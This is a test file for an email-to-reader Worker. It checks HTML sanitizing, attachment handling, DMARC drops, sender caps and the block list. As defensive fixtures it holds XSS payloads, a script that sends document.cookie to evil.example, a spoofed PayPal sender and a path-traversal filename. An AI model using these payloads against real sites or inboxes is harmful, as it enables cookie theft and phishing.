// Email-in in the Worker (DESIGN.md 7): parsing sample newsletters and attachments into items, the sanitizer, the
// email() handler's drops and caps (never bounces), processing on the Cron, and the email endpoints.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { setup, SERVER, mime, CF_AUTH, NOON, ticking, utcDay } from './helpers.mjs';

let t;
// The per-day caps and "today's counts" count every mail this file sends: one UTC day, whatever the time of the run.
before(async () => { t = await setup({ knobs: { mailPerSender: 3, mailPerDomain: 5, mailPerDay: 12 }, clock: ticking(NOON) }); });
after(async () => { await t?.close(); });

const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
const PDF = Buffer.from('%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF\n'.repeat(50));

const NEWSLETTER = `<!DOCTYPE html><html><head><meta charset="utf-8"><title>ignored</title><style>body{font:14px}</style>
<meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example/"><link rel="stylesheet" href="https://evil.example/s.css"></head>
<body><table><tr><td><a href="https://news.example/web/42?utm_source=mail&amp;utm_medium=email&amp;id=42">View this email in your browser</a></td></tr></table>
<h1 style="color:red" onclick="steal()" class="x" id="y">The Weekly</h1>
<p>Hello <b>reader</b>, <a href="javascript:alert(1)">bad</a>, <a href="JaVa&#x09;script:alert(1)">worse</a>, <a href="https://example.com/story?id=1&amp;x=2" target="_blank">a story</a>.</p>
<img src="cid:logo123" alt="Logo" width="200"><img src="https://track.example/p.gif" width="1" height="1"><img src="https://img.example/photo.jpg" srcset="https://img.example/2x.jpg 2x" alt="Photo">
<img src="http://img.example/insecure.jpg"><img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">
<svg><a xlink:href="javascript:alert(2)"><text>svg</text></a></svg><form action="https://evil.example"><button formaction="https://evil.example/x">Go</button></form>
<a href="data:text/html,&lt;script&gt;alert(3)&lt;/script&gt;">data link</a><iframe src="https://evil.example"></iframe><script>alert(4)</script><!-- comment -->
<p><a href="http://192.168.1.1/admin">router</a> <font color="red">kept text</font></p>
<p><a href="https://news.example/unsubscribe">Unsubscribe</a></p></body></html>`;

async function items(raw) {
  const r = await t.dispatch(`${SERVER}/__test/email-items`, { method: 'POST', body: raw });
  assert.equal(r.status, 200);
  return r.json();
}

test('a newsletter: one page item, sanitized, with its "view in browser" link, cid images inlined, pixels dropped', async () => {
  const raw = mime({
    from: '"Example News" <news@news.example>', subject: 'Fwd: The Weekly #42', html: NEWSLETTER, text: 'The Weekly in text '.repeat(30),
    attachments: [{ type: 'image/png', cid: 'logo123', data: PNG }],
  });
  const [page, ...rest] = await items(raw);
  assert.equal(rest.length, 0, 'an inline image is not a document');
  assert.equal(page.kind, 'page');
  assert.equal(page.url, 'https://news.example/web/42?id=42', 'tracking parameters removed');
  assert.equal(page.title, 'The Weekly #42');
  assert.equal(page.from, 'Email · Example News');
  assert.equal(page.xOrigin, 'email');
  const h = page.text;
  assert.match(h, /^<!doctype html><html><head><meta charset="utf-8"><title>The Weekly #42<\/title><meta name="author" content="Example News">/);
  assert.match(h, /<meta name="dl:source" content="email">/);
  for (const bad of [/<script/i, /onclick/i, /style=/i, /javascript:/i, /<svg/i, /<form/i, /<button/i, /<iframe/i, /<base/i, /http-equiv/i,
    /track\.example/, /srcset/, /formaction/, /data:text\/html/, /evil\.example/, /<!--/, /class=/, /id="y"/, /target=/, /insecure\.jpg/, /svg\+xml/, /ignored/]) {
    assert.doesNotMatch(h, bad, String(bad));
  }
  assert.match(h, /<img src="data:image\/png;base64,iVBOR[^"]*" alt="Logo">/, 'the cid: image becomes a data: URI');
  assert.match(h, /<img src="https:\/\/img.example\/photo.jpg" alt="Photo">/);
  assert.match(h, /<a href="https:\/\/example.com\/story\?id=1&amp;x=2">a story<\/a>|<a href="https:\/\/example.com\/story\?id=1&x=2">a story<\/a>/);
  assert.match(h, /<a>router<\/a>/, 'a LAN link loses its href');
  assert.match(h, /kept text/, 'unknown elements are unwrapped, their text kept');
  assert.match(h, /<h1>The Weekly<\/h1>/);
});

test('a newsletter without a browser link gets the non-resolving daylight.invalid address', async () => {
  const [page] = await items(mime({ subject: 'No link', html: '<p>Hello there, this is a long enough newsletter body. '.repeat(10) + '</p>' }));
  assert.equal(page.url, null, 'the url is filled in from the item id when frames are built');
});

test('plain text email -> paragraphs, line breaks and linked public URLs', async () => {
  const [page] = await items(mime({ subject: 'Plain', text: 'Hi <there>,\nsecond line\n\nRead https://example.com/a and http://10.0.0.1/x.\n' }));
  assert.match(page.text, /<p>Hi &lt;there&gt;,<br>second line<\/p>/);
  assert.match(page.text, /<a href="https:\/\/example.com\/a">https:\/\/example.com\/a<\/a>/);
  assert.doesNotMatch(page.text, /href="http:\/\/10/);
});

test('a forwarded document with "Sent from my iPhone": only the file item; other attachments are listed', async () => {
  const doc = await items(mime({ subject: 'Fwd: paper', text: 'Sent from my iPhone', attachments: [{ type: 'application/pdf', name: '../../Quarterly report.pdf', data: PDF }] }));
  assert.equal(doc.length, 1);
  assert.equal(doc[0].kind, 'file');
  assert.equal(doc[0].name, 'Quarterly report.pdf');
  assert.equal(doc[0].mime, 'application/pdf');
  assert.equal(doc[0].title, 'Quarterly report');
  assert.equal(doc[0].size, PDF.length);
  assert.equal(doc[0].url, undefined);
  const both = await items(mime({
    subject: 'Reading list', text: 'A long note about these documents. '.repeat(20),
    attachments: [
      { type: 'application/epub+zip', name: 'book.epub', data: Buffer.from('PK epub') },
      { type: 'application/octet-stream', name: 'notes.md', data: Buffer.from('# Notes') },
      { type: 'application/zip', name: 'archive.zip', data: Buffer.alloc(30_000) },
    ],
  }));
  assert.deepEqual(both.map((i) => i.kind), ['page', 'file', 'file']);
  assert.deepEqual(both.slice(1).map((i) => [i.name, i.mime]), [['book.epub', 'application/epub+zip'], ['notes.md', 'text/markdown']]);
  assert.match(both[0].text, /Not delivered: archive.zip, 30 KB/);
});

test('escaping: hostile subjects and sender names never become markup', async () => {
  const evil = '"><img src=x onerror=alert(1)>';
  const [page] = await items(mime({ from: `"${evil}" <x@evil.example>`, subject: evil, html: '<p>body text that is long enough to be a newsletter</p>'.repeat(5) }));
  assert.doesNotMatch(page.text, /<img src=x/);
  assert.match(page.text, /<title>&quot;&gt;&lt;img src=x onerror=alert\(1\)&gt;<\/title>/);
  assert.ok(page.from.startsWith('Email · ') && page.from.length <= 60, 'the from field is short plain text');
});

test('the sanitizer fixtures (7.5)', async () => {
  const s = async (html, extra = {}) => (await (await t.dispatch(`${SERVER}/__test/sanitize`, { method: 'POST', body: JSON.stringify({ html, ...extra }) })).json()).html;
  assert.equal(await s('<a href="javascript:alert(1)">x</a>'), '<a>x</a>');
  assert.equal(await s('<a href="JaVa&#x09;script:alert(1)">x</a>'), '<a>x</a>');
  assert.equal(await s('<a href=" https://ok.example/ ">x</a>'), '<a href="https://ok.example/">x</a>');
  assert.equal(await s('<svg><a xlink:href="javascript:x">y</a></svg>z'), 'z');
  assert.equal(await s('<base href="https://evil.example/"><p>a</p>'), '<p>a</p>');
  assert.equal(await s('<style>@import url(https://evil.example/x.css);</style><p>a</p>'), '<p>a</p>');
  assert.equal(await s('<meta http-equiv="refresh" content="0;url=https://evil.example"><p>a</p>'), '<p>a</p>');
  assert.equal(await s('<img src="https://i.example/a.png" srcset="https://evil.example/b.png 2x">'), '<img src="https://i.example/a.png">');
  assert.equal(await s('<form><button formaction="https://evil.example">x</button></form>ok'), 'ok');
  assert.equal(await s('<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>'), '<a>x</a>');
  assert.equal(await s('<td colspan="2" rowspan="x" title="t&quot;">c</td>'), '<td colspan="2" title="t">c</td>');
  assert.equal(await s('<img src="cid:a@b">', { cid: { 'a@b': 'data:image/png;base64,AAAA' } }), '<img src="data:image/png;base64,AAAA">');
  assert.equal(await s('<img src="cid:a@b">', { cid: { 'a@b': 'data:image/png;base64,AAAA' }, dropDataImages: true }), '');
  assert.equal(await s('<math><mi>x</mi></math><object data="x"></object><embed src="y"><portal src="z"></portal>t'), 't');
  assert.equal(await s('<p onmouseover="x" style="color:red">t</p>'), '<p>t</p>');
  // Raw-text elements: their content is text to the tokenizer, so unwrapping them would copy it out as live markup.
  assert.equal(await s('<xmp><script>alert(1)</script></xmp>ok'), 'ok');
  assert.equal(await s('<noembed><img src=x onerror=alert(1)></noembed>ok'), 'ok');
  assert.equal(await s('<noframes><script>alert(1)</script></noframes>ok'), 'ok');
  assert.equal(await s('<p>a</p><plaintext><script>alert(1)</script><a href="javascript:x">x</a>'), '<p>a</p>');
  for (const name of ['script', 'style', 'xmp', 'iframe', 'noembed', 'noframes', 'noscript', 'title', 'textarea', 'XMP', 'NoEmbed']) {
    const out = await s(`<${name}><script>alert(1)</script><img src=x onerror=alert(2)></${name}>ok`);
    // For <script> itself the content ends at the first </script>: the <img> after it is markup (and removed), and the
    // outer </script> is a stray end tag, which opens nothing.
    assert.equal(out.replace('</script>', ''), 'ok', `${name}: ${out}`);
  }
  assert.doesNotMatch(await s('<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>z'), /<img|onerror=alert\(1\)>/);
  assert.match(await s('<p>x<image src="https://i.example/a.png" onerror="alert(1)">y</p>'), /^<p>xy(<\/p>)?$/, '<image> is unwrapped, never kept');
  assert.equal(await s('<listing><b>l</b></listing>'), '<b>l</b>');
});

test('a newsletter whose HTML hides markup in <xmp>, and an HTML attachment: no script reaches the Reader', async () => {
  const body = '<p>Weekly</p><xmp><script>fetch("https://evil.example/"+document.cookie)</script></xmp><p>' + 'Long enough body. '.repeat(30) + '</p>';
  const attachment = '<html><head><meta charset="windows-1252"><script>alert(1)</script></head><body><h1>Caf\u00e9</h1><a href="javascript:alert(2)">x</a><img src=x onerror=alert(3)></body></html>';
  const [page, file] = await items(mime({
    subject: 'Weekly', html: body,
    attachments: [{ type: 'text/html', name: 'report.html', data: Buffer.from(attachment, 'latin1') }],
  }));
  assert.equal(page.kind, 'page');
  assert.match(page.text, /<p>Weekly<\/p>/);
  assert.doesNotMatch(page.text, /<script|evil\.example/i);
  assert.equal(file.kind, 'file');
  assert.equal(file.mime, 'text/html');
  assert.match(file.text, /^<!doctype html><html><head><meta charset="utf-8"><title>report<\/title>/);
  assert.match(file.text, /<h1>Café<\/h1>/, 'decoded with the charset its <meta> declares, written as UTF-8');
  assert.doesNotMatch(file.text, /<script|javascript:|onerror|<img/i);
});

test('email() stores, the Cron parses one message per run, the item reaches the outbox and the raw mail is deleted', async () => {
  await t.lane.hello();
  const raw = mime({ headers: [CF_AUTH('pass')], from: 'Example News <news@news.example>', subject: 'Issue 1', html: NEWSLETTER });
  const res = await t.email(raw, { from: 'news@news.example' });
  assert.equal(res.outcome, 'ok');
  assert.equal(res.rejectReason, undefined);
  let [mail] = await t.rows("SELECT * FROM mail WHERE subject = 'Issue 1'");
  assert.equal(mail.state, 'queued');
  assert.ok(await t.env.FILES.get(`m/${mail.id}.eml`));
  const report = await t.cron();
  assert.match(JSON.stringify(report.steps), /"email\d":"true"/);
  [mail] = await t.rows('SELECT * FROM mail WHERE id = ?', mail.id);
  assert.equal(mail.state, 'done');
  assert.equal(JSON.parse(mail.items).length, 1);
  assert.equal(await t.env.FILES.get(`m/${mail.id}.eml`), null, 'raw mail deleted after processing');
  const [row] = await t.rows('SELECT * FROM outbox WHERE id = ?', JSON.parse(mail.items)[0]);
  assert.equal(row.kind, 'page');
  assert.equal(row.title, 'Issue 1');
});

test('the wrong recipient is the only bounce; blocked senders and DMARC failures are dropped silently', async () => {
  const wrong = await t.email(mime({ subject: 'x', text: 'x' }), { to: 'someone-else@mail.test' });
  assert.equal(wrong.rejectReason, 'This address is not set up.');
  assert.equal((await t.api('POST', '/v1/email/block', { json: { pattern: '@spam.example' } })).status, 201);
  const blocked = await t.email(mime({ from: 'a@sub.spam.example', subject: 'Blocked one', text: 'x' }), { from: 'a@sub.spam.example' });
  assert.equal(blocked.outcome, 'ok');
  assert.equal(blocked.rejectReason, undefined, 'never a bounce');
  const forged = mime({ headers: [CF_AUTH('fail'), 'Authentication-Results: evil.example; dmarc=pass'], from: 'ceo@bank.example', subject: 'Forged', text: 'x' });
  assert.equal((await t.email(forged, { from: 'ceo@bank.example' })).rejectReason, undefined);
  const none = mime({ headers: [CF_AUTH('none')], from: 'x@nodmarc.example', subject: 'No DMARC record', text: 'x' });
  await t.email(none, { from: 'x@nodmarc.example' });
  const rows = Object.fromEntries((await t.rows("SELECT subject, state, reason FROM mail WHERE subject IN ('Blocked one', 'Forged', 'No DMARC record')")).map((r) => [r.subject, r]));
  assert.deepEqual(rows['Blocked one'], { subject: 'Blocked one', state: 'dropped', reason: 'blocked' });
  assert.deepEqual(rows.Forged, { subject: 'Forged', state: 'dropped', reason: 'dmarc' });
  assert.equal(rows['No DMARC record'].state, 'queued', 'dmarc=none passes under the open policy');
});

test('mail over 2 MiB on the Free plan waits for Workers Paid, unparsed', async () => {
  const big = mime({ from: 'big@large.example', subject: 'Big one', text: 'x', attachments: [{ type: 'application/pdf', name: 'big.pdf', data: Buffer.alloc(2_200_000, 7) }] });
  assert.equal((await t.email(big, { from: 'big@large.example' })).rejectReason, undefined);
  const [row] = await t.rows("SELECT state, reason FROM mail WHERE subject = 'Big one'");
  assert.deepEqual(row, { state: 'waiting-paid', reason: 'too-large-for-free' });
  const recent = (await t.api('GET', '/v1/email/recent')).json;
  assert.ok(recent.find((m) => m.subject === 'Big one' && m.state === 'waiting-paid'));
});

test('caps per sender, per domain and per day drop silently', async () => {
  const send = (from, subject) => t.email(mime({ from, subject, text: 'x' }), { from });
  for (let i = 0; i < 4; i++) assert.equal((await send('one@caps.example', `cap-a${i}`)).rejectReason, undefined);
  for (let i = 0; i < 2; i++) await send(`other${i}@caps.example`, `cap-b${i}`);
  const states = Object.fromEntries((await t.rows("SELECT subject, state, reason FROM mail WHERE subject LIKE 'cap-%'")).map((r) => [r.subject, `${r.state}:${r.reason}`]));
  assert.equal(states['cap-a3'], 'dropped:sender-cap');
  assert.equal(states['cap-b0'], 'queued:null');
  assert.equal(states['cap-b1'], 'dropped:domain-cap');
  for (let i = 0; i < 6; i++) await send(`day${i}@d${i}.example`, `cap-day${i}`);
  const day = (await t.rows("SELECT state, reason FROM mail WHERE subject LIKE 'cap-day%' ORDER BY received")).map((r) => r.reason);
  assert.ok(day.includes('daily-cap'), JSON.stringify(day));
});

test('the email endpoints: address, block list, today’s counts, unblock, recent', async () => {
  const info = (await t.api('GET', '/v1/email')).json;
  assert.equal(info.address, t.emailAddress);
  assert.match(info.address, /^daylight-[a-z2-7]{10}@mail\.test$/);
  assert.equal(info.addressChanged, null);
  assert.deepEqual(info.blocked.map((b) => b.pattern), ['@spam.example']);
  assert.ok(info.today.received >= 10 && info.today.dropped >= 3 && info.today.delivered >= 1);
  assert.deepEqual((await t.rows("SELECT day FROM usage WHERE kind = 'email_in'")).map((r) => r.day), [utcDay(NOON)], 'every mail on one day');
  assert.equal(info.state, 'ready');
  assert.equal((await t.api('POST', '/v1/email/block', { json: { pattern: 'not a pattern' } })).status, 400);
  assert.equal((await t.api('POST', '/v1/email/unblock', { json: { pattern: '@SPAM.example' } })).status, 204);
  assert.deepEqual((await t.api('GET', '/v1/email')).json.blocked, []);
  const recent = (await t.api('GET', '/v1/email/recent')).json;
  assert.ok(recent.length <= 30);
  assert.ok(recent.every((m) => ['queued', 'done', 'dropped', 'waiting-paid', 'failed'].includes(m.state)));
  assert.ok(recent.find((m) => m.subject === 'Issue 1').items.length === 1);
});

test('without DAYLIGHT_EMAIL_DOMAIN: needs-domain, 409 NOT_CONFIGURED and every message refused', async () => {
  const no = await setup({ emailDomain: '' });
  try {
    assert.equal((await no.api('GET', '/v1/status')).json.features.email.state, 'needs-domain');
    const r = await no.api('GET', '/v1/email');
    assert.equal(r.status, 409);
    assert.deepEqual(r.json.error.missing, ['DAYLIGHT_EMAIL_DOMAIN']);
    assert.match(r.json.error.message, /DAYLIGHT_EMAIL_DOMAIN/);
    const res = await no.email(mime({ subject: 'x', text: 'x' }), { to: 'daylight-x@mail.test' });
    assert.equal(res.rejectReason, 'This address is not set up.');
  } finally { await no.close(); }
});

test('an encoded-word display name can’t stand in for the sender: block list, caps, "Recent mail" and the item use the real address', async () => {
  const e = await setup();
  try {
    assert.equal((await e.api('POST', '/v1/email/block', { json: { pattern: '@evil.example' } })).status, 201);
    const from = '=?utf-8?q?PayPal_<service@paypal.com>?= <spam@evil.example>';
    await e.email(mime({ headers: [CF_AUTH('pass')], from, subject: 'Your account', text: 'x' }), { from: 'spam@evil.example' });
    const [row] = await e.rows("SELECT from_addr, from_domain, from_name, state, reason FROM mail WHERE subject = 'Your account'");
    assert.deepEqual(row, { from_addr: 'spam@evil.example', from_domain: 'evil.example', from_name: 'PayPal', state: 'dropped', reason: 'blocked' });
    const quoted = '"service@paypal.com" <other@evil2.example>';
    await e.email(mime({ headers: [CF_AUTH('pass')], from: quoted, subject: 'Quoted', text: 'x' }), { from: 'other@evil2.example' });
    const recent = (await e.api('GET', '/v1/email/recent')).json.find((m) => m.subject === 'Quoted');
    assert.equal(recent.from, 'other@evil2.example', 'a name that looks like an address is not shown');
    const r = await e.dispatch(`${SERVER}/__test/email-items`, { method: 'POST', body: mime({ from, subject: 'Item', text: 'A newsletter body long enough. '.repeat(20) }) });
    const [page] = await r.json();
    assert.equal(page.from, 'Email · PayPal');
    assert.doesNotMatch(page.text, /paypal\.com/);
  } finally { await e.close(); }
});
